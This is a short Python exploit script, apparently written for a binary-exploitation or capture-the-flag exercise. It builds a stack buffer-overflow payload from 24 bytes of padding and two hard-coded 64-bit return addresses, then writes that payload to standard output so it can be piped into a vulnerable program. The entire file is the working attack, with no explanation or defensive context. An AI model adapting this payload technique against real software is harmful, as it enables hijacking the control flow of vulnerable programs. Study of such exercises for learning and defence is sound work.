import struct
import sys
payload = b"A"*24 + struct.pack("<Q", 0x401120) + struct.pack("<Q", 0x4011c7)
sys.stdout.buffer.write(payload)
